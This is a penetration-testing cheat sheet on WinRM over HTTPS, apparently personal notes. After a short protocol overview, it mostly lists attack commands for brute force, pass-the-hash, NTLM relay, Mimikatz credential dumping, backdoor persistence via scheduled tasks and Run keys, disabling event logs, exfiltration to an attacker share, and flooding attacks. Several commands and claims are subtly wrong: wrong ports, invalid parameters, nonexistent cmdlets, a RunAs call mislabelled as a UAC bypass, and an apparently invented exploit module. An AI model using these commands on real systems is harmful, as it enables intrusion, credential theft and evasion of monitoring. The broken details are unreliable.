# Index
- [[Ports, Protocols, and Services]]
	- [[P5985 WinRM HTTP]]

# Windows Remote Management (WinRM) HTTPS
- **Port Number:** 5986
- **Protocol:** TCP
- **Service Name:** WinRM (Windows Remote Management) over HTTPS
- **Defined in:** Windows Operating Systems, WS-Management protocol (part of the DMTF standard)

Windows Remote Management (WinRM) is a protocol used for remotely managing Windows-based machines. When configured to use HTTPS, WinRM ensures that all communications are encrypted, providing a secure channel for remote management tasks. WinRM is based on the WS-Management protocol, which is a SOAP-based, firewall-friendly protocol that allows for hardware and operating system management.

## Overview of Features

- **Secure Communication:** By utilizing HTTPS, WinRM ensures that all data transferred between the client and server is encrypted using TLS, protecting against eavesdropping and man-in-the-middle attacks.
  
- **Remote Management:** WinRM allows administrators to execute commands, scripts, and manage services and processes on remote Windows machines.

- **WS-Management Protocol:** WinRM is built on the WS-Management protocol, which is standardized by the DMTF (Distributed Management Task Force) and supports a wide range of management tasks.

- **Authentication Support:** WinRM over HTTPS supports multiple authentication methods, including Kerberos, NTLM, and certificate-based authentication, allowing for flexible security configurations.

- **Firewall-Friendly:** The protocol is designed to work through firewalls, with HTTPS traffic typically allowed through most corporate firewalls.

## Typical Use Cases

- **Remote Administration:** Administering Windows servers remotely, including managing services, processes, and performing system diagnostics.

- **Automation:** Integrating with scripts and automation frameworks like PowerShell to automate administrative tasks across multiple Windows servers.

- **Centralized Management:** Used in environments where centralized management of multiple Windows machines is required, such as in data centers or large enterprise networks.

- **Secure Configuration:** Ensuring that all remote management operations are conducted over a secure channel to comply with security policies and regulations.

## How WinRM HTTPS Works

1. **Certificate Configuration:**
   - **Step 1:** A valid SSL/TLS certificate is installed on the server to enable HTTPS communication. This certificate can be self-signed or issued by a trusted Certificate Authority (CA).
   - **Step 2:** The certificate is bound to port 5986 to allow encrypted communication over HTTPS.

2. **Service Configuration:**
   - **Step 3:** WinRM is configured to use HTTPS by modifying the listener settings. This can be done using PowerShell or the `winrm` command-line utility.
   - **Step 4:** The service is started, and it listens for incoming connections on port 5986.

3. **Client Connection:**
   - **Step 5:** A client initiates a connection to the server on port 5986 using an HTTPS URL (e.g., `https://<target_ip>:5986/wsman`).
   - **Step 6:** The client and server perform a TLS handshake, where the server presents its certificate to the client.

4. **Authentication:**
   - **Step 7:** The client authenticates to the server using one of the supported methods (Kerberos, NTLM, or certificate-based authentication).
   - **Step 8:** Upon successful authentication, the client is granted access to WinRM services.

5. **Remote Command Execution:**
   - **Step 9:** The client sends commands, scripts, or queries to the server using SOAP messages encapsulated within HTTPS.
   - **Step 10:** The server processes these requests and sends back the results over the same secure channel.

6. **Connection Termination:**
   - **Step 11:** Once the remote management tasks are completed, the client can terminate the session, closing the HTTPS connection.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` connects to `<target_ip>`:5986 using HTTPS.
- **Server:** `<target_ip>` authenticates and executes the command received, returning the results to `<attack_ip>`.

# Additional Information

## Security Considerations
- **TLS Security:** WinRM over HTTPS relies heavily on the strength of the TLS configuration. Weak ciphers or outdated protocols (e.g., TLS 1.0) can compromise the security of the connection.
  
- **Authentication Mechanisms:** While Kerberos is preferred for its security, NTLM or certificate-based authentication may be used, each with its own security implications.

- **Firewall Configuration:** Ensure that port 5986 is open and that the firewall rules are correctly configured to allow WinRM traffic only from trusted sources.

- **Audit and Logging:** Monitoring and logging WinRM activity is critical for detecting unauthorized access attempts or potential breaches.

## Alternatives
- **SSH:** For environments where cross-platform compatibility is required, SSH might be used as an alternative to WinRM for secure remote management.
  
- **PowerShell Remoting:** Built on WinRM, PowerShell Remoting is often used for administrative tasks and offers advanced scripting capabilities.

## Advanced Usage
- **Just Enough Administration (JEA):** A security feature that allows you to delegate specific administrative tasks to users without giving them full administrative rights.

## Modes of Operation
- **Interactive Mode:** Administrators can open an interactive PowerShell session on a remote machine over HTTPS using WinRM.
  
- **Automated Mode:** Scripts and automation frameworks can execute predefined tasks across multiple machines without interactive login.

## Configuration Files

WinRM configuration is primarily handled via commands and registry settings, but for environments using `Group Policy`, the following can be relevant:

1. **PowerShell Commands for Configuration:**
- **Enable HTTPS Listener:**
  - Command:
    ```powershell
    winrm quickconfig -transport:https
    ```
  - **Description:** This command sets up a basic WinRM HTTPS listener.

2. **Manual Configuration:**
  - **File Location:** Settings are stored in the Windows registry under `HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN\Listener`.
  - **Relevant Settings:**
    - `Transport`: Specifies the transport protocol, set to `HTTPS`.
    - `CertificateThumbprint`: Specifies the thumbprint of the certificate used for HTTPS.

3. **Group Policy Configuration:**
- **File Location:** Managed through Group Policy at `Computer Configuration > Administrative Templates > Windows Components > Windows Remote Management (WinRM) > WinRM Service`.
- **Configuration Example:**
  - Enable WinRM Service:
    - **Setting:** `Allow remote server management through WinRM`.
    - **Description:** Enables WinRM over HTTPS and configures security settings.

## Potential Misconfigurations

1. **Incorrect Certificate Configuration:**
   - **Risk:** Using an improperly configured or expired certificate can prevent secure connections or expose the server to man-in-the-middle attacks.
   - **Exploitation:** Attackers can use this to intercept traffic or perform SSL stripping attacks.

2. **Weak TLS Configuration:**
   - **Risk:** Allowing weak ciphers or protocols (e.g., TLS 1.0) can make the connection vulnerable to cryptographic attacks.
   - **Exploitation:** Attackers can use tools like SSL Labs or `sslscan` to identify weaknesses and potentially decrypt traffic.

3. **Open Port 5986 to the Internet:**
   - **Risk:** Exposing WinRM HTTPS to the public internet can lead to brute-force attacks or unauthorized access.
   - **Exploitation:** Attackers can target the exposed service with password guessing attacks or exploit vulnerabilities in the WinRM implementation.

## Default Credentials

WinRM itself does not have default credentials, but it relies on the Windows operating system's credentials for authentication. The following might be common in default setups:

- **Administrator Account:**
  - Username: `Administrator`
  - Password: Depends on the system setup (in some cases, it may be blank or a weak password on initial setup).

- **Local System Account:**
  - Username: `SYSTEM`
  - Password: Not applicable, as this account does not use traditional authentication.

# Interaction and Tools

## Tools

### [[WinRM Cheat Sheet]]
- **Start WinRM Service:** Starts the WinRM service if it is not already running.
	```powershell
	Start-Service -Name WinRM
	```
- **Check WinRM Service Status:** Retrieves the current status of the WinRM service (e.g., running, stopped).
	```powershell
	Get-Service -Name WinRM
	```
- **Enabling WinRM:** Enables WinRM service on the local machine, allowing remote connections.
    ```powershell
    Enable-PSRemoting -Force
    ```
- **Check WinRM Status:** Lists all configured WinRM listeners and their current status.
    ```powershell
    winrm enumerate winrm/config/listener
    ```
- **Create an HTTPS Listener:** Configures WinRM to listen for connections over HTTPS.
    ```powershell
    winrm quickconfig -transport:https
    ```
- **Add TrustedHost:** Allow a specific IP to manage the system via WinRM.
	```powershell
	winrm set winrm/config/client @{TrustedHosts="192.168.1.100"}
	```
- **Set Custom WinRM Port:** Description:** Changes the default port for WinRM communication to a custom port, improving security by avoiding well-known ports.
	```powershell
	Set-Item -Path WSMan:\localhost\Service\Listeners\Listener*\Port -Value 4443
	```
- **Test WinRM Connection:** Tests the connectivity to a remote WinRM service, ensuring that it’s reachable.
    ```powershell
    Test-WsMan <target_ip> -UseSSL
    ```
- **Connect to Remote Machine:** Initiates a remote session with the target machine using the specified credentials.
	```powershell
	Enter-PSSession -ComputerName <target_ip> -Credential <username> -UseSSL
	```
- **Executing Remote Commands:** Executes the `Get-Process` command on the remote machine and returns the results to the local session.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock {Get-Process} -UseSSL
    ```
- **Batch Command Execution:** Executes multiple commands in a single session, useful for gathering various types of information from a remote machine.
```powershell
Invoke-Command -ComputerName <target_ip> -ScriptBlock { Get-Service; Get-EventLog -LogName System } -UseSSL
```
- **Persistent Sessions:** Creates a persistent session on the remote machine for executing multiple commands without re-authentication.
    ```powershell
    $session = New-PSSession -ComputerName <target_ip>
    Invoke-Command -Session $session -ScriptBlock {Get-Service} -UseSSL
    ```
- **Copying Files Remotely:** Copies files from the local machine to the remote machine over the established WinRM session.
    ```powershell
    Copy-Item -Path "C:\local\file.txt" -Destination "C:\remote\path\" -ToSession $session -UseSSL
    ```
- **Set Custom WinRM Settings:** Configures WinRM to disallow unencrypted connections, enforcing HTTPS only.
    ```powershell
    winrm set winrm/config/service '@{AllowUnencrypted="false"}'
    ```

### [[4. Tool Guides/Incomplete/PowerShell]]
- **Execute Remote Command:** Execute remote commands and scripts, gathering data, and managing configurations.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock {Get-Service} -UseSSL
    ```
  
### Windows Admin Center
  - **Description:** A web-based tool for managing Windows servers that uses WinRM under the hood for communication.
  - **Use Case:** Provides a graphical interface for managing servers, including remote management tasks like service monitoring and configuration.

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 5985"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 5985
    ```

### [[NetCat]]
- **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 5985
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 5985 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 5985
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
	nc <target_ip> 5985 < secret_data.txt
	```

### [[SoCat Cheat Sheet]]
- **SoCat TCP Connect:** Simple tests to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:5985
	```

### [[HPing3 Cheat Sheet]]
- **Send Packet:** Send TCP packet to the service. Use `-2` to send UDP packet.
    ```bash
    hping3 <target_ip> -p 5985
    ```

### [[Evil-WinRM Cheat Sheet]]
- **Connect to a host:**
	```bash
	evil-winrm --ip <target_ip> --user <username> --password <password>
	```
- **Connect to a host, passing the password hash:**
	```bash
	evil-winrm --ip <target_ip> --user <username> --hash <nt_hash>
	```
- **Connect to a host, specifying directories for scripts and executables:**
	```bash
	evil-winrm --ip <target_ip> --user <username> --password <password> --scripts <path_to_scripts> --executables <path_to_executables>
	```
- **Connect to a host, using SSL:**
	```bash
	evil-winrm --ip <target_ip> --user <username> --password <password> --ssl --pub-key <path_to_pubkey> --priv-key <path_to_privkey>
	```
- **Upload a file to the host:**
	```bash
	PS > upload <path_to_local_file> <path_to_remote_file>
	```
- **Get a list of loaded PowerShell functions:**
	```bash
	PS > menu
	```
- **Load a PowerShell script from the --scripts directory:**
	```bash
	PS > <script.ps1>
	```
- **Invoke a binary on the host from the --executables directory:**
	```bash
	PS > Invoke-Binary <binary.exe>
	```

### [[CrackMapExec]]
- **WinRM Authentication Testing Credentials:**
	```c
	crackmapexec winrm <target_ip> -u <username> -p `<password>'
	```
- **If the SMB port is closed you can also use the flag `-d` DOMAIN to avoid an SMB connection:**
	```c
	crackmapexec winrm <target_ip> -d <domain> -u <username> -p `<password>'
	```
- **Brute Force:** Just check a pair of credentials
	```c
	crackmapexec winrm <target_ip> -d <domain> -u <username_wordlist> -p `<password_wordlist>'
	```
- **Username + Password + CMD command execution:**
	```c
	crackmapexec winrm <target_ip> -d <domain> -u <username> -p `<password>' -x "whoami"
	```
- **Username + Hash + PS command execution:** CrackMapExec won't give you an interactive shell, but it will check if the creds are valid to access WinRM
	```c
	crackmapexec winrm <target_ip> -d <domain> -u <username> -H `<ntlm_hash> -X '$PSVersionTable'
	```
- **Password Spraying (without brute force):** By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Useful for spraying a single password against a large user list.
	```c
	crackmapexec winrm <target_ip> -d <domain> -u <username_wordlist> -p `<password_wordlist>' --no-bruteforce
	```
- **Defeating LAPS:** Using CrackMapExec when LAPS installed on the domain. If LAPS is used inside the domain, it can be hard to use CrackMapExec to execute a command on every computer on the domain. Therefore, a new core option has been added `--laps`! If you have compromised an accout that can read LAPS password you can use CrackMapExec like this. If the default administrator name is not administrator add the user after the option `--laps name`.
	```c
	crackmapexec winrm <target_ip> -d <domain> -u <username> -p `<password>' --laps
	```

### [[Impacket]]

#### [[Impacket-WMIExec]]
- **Connect via WMIExec:** If no password is provided, it will be prompted. Using parameter-k you can authenticate against Kerberos instead of NTLM.
	```bash
	impacket-wmiexec <domain>/<username>:'<password>'@<target_ip>
	impacket-wmiexec -hashes LM:NT <username>@<target_ip>
	```

### [[SSLScan]]
- **Scan Target:** Detailed analysis of an HTTPS service’s SSL/TLS configuration.
    ```bash
    sslscan <target_ip>:5986
    ```

### [[SSLyze]]
- **Scan Target:** Automated testing and reporting on the security of an HTTPS service.
    ```bash
    sslyze --regular <target_ip>:5986
    ```

### [[SSLStrip Cheat Sheet]]
- **SSL Downgrade:**
	```bash
	sslstrip -l 5986
	```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 5986
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 5986
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

## Initial Access

### Pass-the-Hash
- **Tool:** [[Evil-WinRM Cheat Sheet]]
    ```bash
    evil-winrm -i <target_ip> -u <username> -H <NTLM_hash> -S
    ```

<br>

- **Tool:** [[CrackMapExec]]
    ```bash
    crackmapexec winrm <target_ip> -u <username> -H <NTLM_hash>
    ```
- **Description:** Uses an NTLM hash to authenticate with the WinRM service without needing the plaintext password.

### [[Relay Attacks]]
- **Tool:** [[Responder Cheat Sheet]], [[Impacket-NTLMRelayX Cheat Sheet]]
	```bash
	impacket-ntlmrelayx -tf targets.txt
	sudo responder -I <interface>
	```
- **Description:** Relay captured credentials to the target service, potentially gaining unauthorized access.

## Persistence

### Adding a New WinRM Listener
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
	```powershell
	winrm create winrm/config/Listener?Address=*+Transport=HTTPS
	```
- **Description:** Create an additional WinRM listener on a different port to maintain persistent access.

### Creating a Persistent Session
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    $session = New-PSSession -ComputerName <target_ip>
    ```
- **Description:** Establishes a persistent remote session that can be re-used for multiple commands, maintaining access over time.

### Creating Scheduled Tasks
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
```powershell
schtasks /create /tn "WinRM Backdoor" /tr "powershell.exe -Command 'Start-Process powershell.exe -ArgumentList Enter-PSSession -ComputerName <target_ip> -UseSSL'" /sc onstart
```
- **Description:** Schedules a task to re-enable or maintain a persistent WinRM session upon system reboot.

### Creating Services
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
	```powershell
	New-Service -Name "MaliciousWinRM" -Binary "malicious.exe" -DisplayName "WinRM Backup"
	```
- **Description:** Register a malicious service that provides persistent access through WinRM.

### Installing Backdoors
- **Tool:** [[Evil-WinRM Cheat Sheet]]
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -s backdoor.ps1
    ```
- **Description:** Executes a PowerShell script to install a backdoor on the remote machine for persistent access.

### Backdoor Creation
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Backdoor' -Value 'C:\backdoor.exe'
    ```
- **Description:** Configures a persistent backdoor to be executed on startup, ensuring continued access even if WinRM is disabled.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port <port>"
    ```
- **Description:** Capture traffic and extract plaintext credentials.

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[BetterCap Cheat Sheet]]
	```bash
	bettercap -iface <interface> -T <target_ip> --proxy
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

### Extracting Credentials via PowerShell
- **Tool:** [[Mimikatz Cheat Sheet]]
    ```powershell
    Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
    ```
- **Description:** Executes Mimikatz on the remote machine to dump plaintext credentials or hashes.

### SSL Strip Attack
- **Tool:** [[BetterCap Cheat Sheet]], [[SSLStrip Cheat Sheet]]
    ```bash
    bettercap -iface <interface> -T <target_ip> --proxy
    
    sslstrip -l <target_port>
    ```
- **Description:** Stripping SSL from connections in a man-in-the-middle attack, forcing clients to connect over unencrypted channels.

## Privilege Escalation

### Exploiting Misconfigured Services
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Get-Service -Name <vulnerable_service> | Set-Service -StartupType Automatic
    ```
- **Description:** Identifies and exploits misconfigured services that can be manipulated to escalate privileges.

### Bypassing UAC
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Invoke-Command -ComputerName <target_ip> -UseSSL -ScriptBlock { Start-Process cmd -Verb RunAs }
    ```
- **Description:** Attempts to bypass User Account Control (UAC) to gain elevated privileges on the remote machine.

## Internal Reconnaissance

### Gathering System Information
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock {Get-SystemInfo}
    ```
- **Description:** Collects detailed system information from the remote machine to aid in further attacks.

### Network Mapping via WinRM
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Test-NetConnection -ComputerName <other_ip> -Port 5986
    ```

    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock {Test-Connection -ComputerName (1..254 | ForEach-Object {"192.168.1.$_"})}
    ```
- **Description:** Maps internal network hosts from the remote machine by pinging them via WinRM.

### Service Enumeration
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Get-Service -ComputerName <target_ip> -UseSSL
    ```
- **Description:** Enumerates all running services on the remote machine to identify potential targets for exploitation.

## Lateral Movement, Pivoting, and Tunnelling

### Using WinRM for Lateral Movement
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]], [[Evil-WinRM Cheat Sheet]]
	```bash
	evil-winrm -i <target_ip> -u <username> -p <password> --exec 'Enter-PSSession -ComputerName <next_target_ip>'
	```
- **Description:** Move laterally through the network by establishing WinRM sessions with additional hosts.

### Pivoting via PowerShell Remoting
- **Tool:** PowerShell
    ```powershell
    $session = New-PSSession -ComputerName <target_ip>
    Invoke-Command -Session $session -ScriptBlock {New-PSSession -ComputerName <next_target_ip>}
    ```
- **Description:** Establishes a session on a new target by pivoting through an existing WinRM session.

### WinRM Tunneling
- **Tool:** [[SSH]]
    ```bash
    ssh -L 5986:<target_ip>:5986 user@jump_host
    ```
- **Description:** Tunnels WinRM traffic through an SSH connection to bypass network restrictions and reach the target.

## Defense Evasion

### Obfuscating PowerShell Commands
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Invoke-Command -ComputerName <target_ip> -UseSSL -ScriptBlock {Invoke-Expression -Command ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5zdGFsbCAtbW9kdWxlIFBob3Rvbi1CbG9n==')))}
    ```

	```powershell
	Invoke-Command -ComputerName <target_ip> -UseSSL -ScriptBlock { [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aGVsbG8gd29ybGQ=")) }
	```
- **Description:** Obfuscates PowerShell commands sent via WinRM to avoid detection by security tools.

### Using Encoded Commands
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
	```powershell
	powershell.exe -encodedCommand <encoded_command>
	```
- **Description:** Execute commands in an encoded format to bypass command-line logging and detection mechanisms.

### Using Alternate Credentials
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    $cred = Get-Credential
    Invoke-Command -ComputerName <target_ip> -Credential $cred -UseSSL -ScriptBlock {Get-Service}
    ```
- **Description:** Executes commands using alternate credentials to avoid triggering alarms associated with certain accounts.

### Disabling Event Logs
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Invoke-Command -ComputerName <target_ip> -UseSSL -ScriptBlock { Stop-Service -Name 'EventLog' }
    ```
- **Description:** Disables event logging on the target machine to evade detection.

### Disabling WinRM Logging
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
	```powershell
	wevtutil.exe sl Microsoft-Windows-WinRM/Operational /e:false
	```
- **Description:** Disable logging for the WinRM service to avoid detection by security monitoring systems.

## Data Exfiltration

### Staging Data for Exfiltration
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
	```powershell
	Compress-Archive -Path "C:\Sensitive\*" -DestinationPath "C:\Temp\archive.zip"
	Invoke-Command -ComputerName <target_ip> -ScriptBlock { Copy-Item "C:\Temp\archive.zip" -Destination "\\<attacker_ip>\share" } -UseSSL
	```
- **Description:** Compress and stage data on a remote machine before exfiltrating it through a shared resource.

### Exfiltrating Data via WinRM
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Invoke-Command -ComputerName <target_ip> -UseSSL -ScriptBlock { Get-Content C:\SensitiveData.txt | Out-File -FilePath C:\inetpub\wwwroot\exfiltrated_data.txt -Force }
    ```
- **Description:** Reads sensitive data from the remote machine and saves it locally for exfiltration.

### Using PowerShell Remoting for Exfiltration
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Invoke-Command -ComputerName <target_ip> -UseSSL -ScriptBlock {Copy-Item -Path C:\sensitive_data.txt -Destination C:\Users\Public -Force }
    ```
- **Description:** Copies sensitive data to a publicly accessible location for later retrieval.

### Exfiltrating Data via Evil-WinRM
- **Tool:** [[Evil-WinRM Cheat Sheet]]
	```bash
	evil-winrm -i <target_ip> -u <username> -p <password> --upload <local_file> <remote_path>
	```
- **Description:** Upload sensitive data from the target system to a remote location for exfiltration.

### Stealthy Data Exfiltration
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Invoke-Command -ComputerName <target_ip> -UseSSL -ScriptBlock { $data = Get-Content C:\SensitiveData.txt; foreach ($char in $data) { Write-Host $char -NoNewline; Start-Sleep -Milliseconds 50 } }
    ```
- **Description:** Exfiltrates data character by character to avoid large, detectable transfers.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra <protocol>://<target_ip> -s 5986 -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra <protocol>://<target_ip> -s 5986 -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

### Offline Hash Cracking
- **Tool:** [[John the Ripper Cheat Sheet]]
    ```bash
    john --wordlist=<path/to/wordlist> <hash_file>
    ```

<br>

- **Tool:** [[HashCat Cheat Sheet]]
	```bash
	hashcat -m <mode> <hash_file> <path/to/wordlist>
	```
- **Description:** Cracks dumped password hashes to gain access.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p 5986 --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p 5986 --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### SSL/TLS Handshake Flood
- **Tool:** [[HPing3 Cheat Sheet]]]
     ```bash
     hping3 <target_ip> -p 5986 -S --flood --rand-source -c 1000
     ```
- **Description:** Floods the service with SSL/TLS handshake requests, overwhelming the server.

### Memory Exhaustion via WinRM
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Invoke-Command -ComputerName <target_ip> -UseSSL -ScriptBlock {while ($true) {1..10000 | % {Start-Process "notepad"}}}
    ```
- **Description:** Exhausts system memory by repeatedly launching processes via WinRM, leading to a denial of service.

### Service Crashing
- **Tool:** [[Scapy]]
	```bash
	from scapy.all import *
	packet = IP(dst="<target_ip>")/TCP(dport=5986,flags="S")/("A"*65000)
	send(packet, loop=1)
	```
- **Description:** Send malformed or oversized packets to the WinRM service, potentially causing it to crash.

## Exploits 

### Heartbleed (CVE-2014-0160)
- **Tool:** [[Nmap]]
    ```bash
    nmap --script ssl-heartbleed -p 5986 <target_ip>
    ```
- **Description:** Exploiting the Heartbleed vulnerability in OpenSSL to extract sensitive information from the server's memory.

### POODLE (Padding Oracle On Downgraded Legacy Encryption)
- **Tool:** [[Nmap]]
    ```bash
    nmap --script ssl-poodle -p 5986 <target_ip>
    ```
- **Description:** Exploit the POODLE vulnerability by forcing a downgrade to SSL 3.0 and performing a padding oracle attack.

### DROWN (CVE-2016-0800)
- **Tool:** [[Nmap]]
	```bash
	nmap --script ssl-drown -p 5986 <target_ip>
	```
- **Description:** Exploit the DROWN vulnerability by attacking servers that support both SSLv2 and TLS, potentially decrypting secure connections.

### SSL/TLS Downgrade Attack
- **Tool:** [[BetterCap Cheat Sheet]], [[SSLStrip Cheat Sheet]]
     ```bash
     bettercap -iface <interface> -T <target_ip> --proxy
     
     sslstrip -l <target_port>
     ```
- **Description:** Forces a downgrade of the SSL/TLS connection to a weaker protocol that can be exploited or decrypted.

### CVE-2021-31166 (HTTP Protocol Stack Remote Code Execution)
- **Tool:** [[Metasploit]]
	````bash
	use exploit/windows/http/http_protocol_stack_rce
	````
- **Description:** Exploits a vulnerability in the HTTP Protocol Stack used by WinRM that could lead to remote code execution.

# Resources

|**Website**|**URL**|
|-|-|
|WinRM Documentation|https://docs.microsoft.com/en-us/windows/win32/winrm/portal|
|WS-Management Protocol|https://www.dmtf.org/standards/wsman|
|Evil-WinRM GitHub|https://github.com/Hackplayers/evil-winrm|
|PowerShell Remoting Guide|https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/|
|Metasploit Modules for WinRM|https://www.rapid7.com/db/modules/|
|TLS Security Best Practices|https://csrc.nist.gov/publications/detail/sp/800-52/rev-2/final|
|CrackMapExec Documentation|https://github.com/byt3bl33d3r/CrackMapExec|
|Nmap Scripting Engine (NSE) Guide|https://nmap.org/book/nse.html|
|hping3 Manual|http://www.hping.org/manpage.html|
|Windows Security Baselines|https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-security-baselines|
